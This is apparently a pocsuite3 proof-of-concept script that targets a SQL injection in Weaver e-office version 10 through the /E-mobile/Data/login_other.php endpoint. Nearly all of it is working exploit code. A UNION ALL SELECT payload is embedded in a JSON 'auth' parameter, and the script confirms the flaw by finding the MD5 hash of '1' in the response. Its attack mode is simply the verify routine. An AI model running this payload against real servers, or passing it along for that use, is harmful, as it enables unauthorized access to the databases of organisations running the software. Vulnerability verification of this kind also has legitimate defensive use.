#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''泛微e-office_login_other_sqli'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = '''sql-inj'''
    taskType = '''undetermined'''
    references = ['''''']
    appName = '''Eoffice'''
    appVersion = '''10'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        verify_url = make_verify_url(self.url, '/E-mobile/Data/login_other.php?diff=sync&auth={"auths":[{"value":"%27+UNION+ALL+SELECT+NULL,NULL,MD5(1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"}]}', mod=0)
        resp = requests.get(verify_url, verify=False, timeout=20)
        if b'c4ca4238a0b923820dcc509a6f75849b' in resp.content and resp.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = verify_url
            result['VerifyInfo']['port'] = port
        return self.parse_attack(result)

    _attack = _verify

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
